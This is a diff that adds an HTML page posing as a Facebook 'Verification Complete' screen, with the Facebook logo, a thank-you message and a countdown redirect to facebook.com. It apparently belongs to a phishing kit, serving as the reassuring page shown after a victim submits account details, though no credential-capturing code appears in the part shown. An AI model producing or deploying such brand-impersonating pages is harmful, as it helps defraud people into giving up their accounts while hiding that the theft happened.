@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Facebook - Verification Complete</title>
+    <link rel="stylesheet" href="/style.css">
+</head>
+<body>
+    <div class="container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/93/Facebook_logo_%282023%29.svg/960px-Facebook_logo_%282023%29.svg.png" alt="Facebook" class="fb-logo">
+        
+        <div class="review-container">
+            <div class="screen-title">Verification Complete</div>
+            <div class="screen-text">Thank you for verifying your account. You'll be redirected to Facebook shortly.</div>
+            
+            <div class="loader"></div>
+            <div style="margin-top: 20px; color: #65676b;">Redirecting in <span id="countdown">10</span> seconds...</div>
+        </div>
+    </div>
+    
+    <script>
+        let countdown = 10;
+        const countdownEl = document.getElementById('countdown');
+        
+        const interval = setInterval(() => {
+            countdown--;
+            countdownEl.textContent = countdown;
+            
+            if (countdown <= 0) {
+                clearInterval(interval);
+                window.location.href = 'https://facebook.com';
+            }
+        }, 1000);
+    </script>
+</body>
+</html>
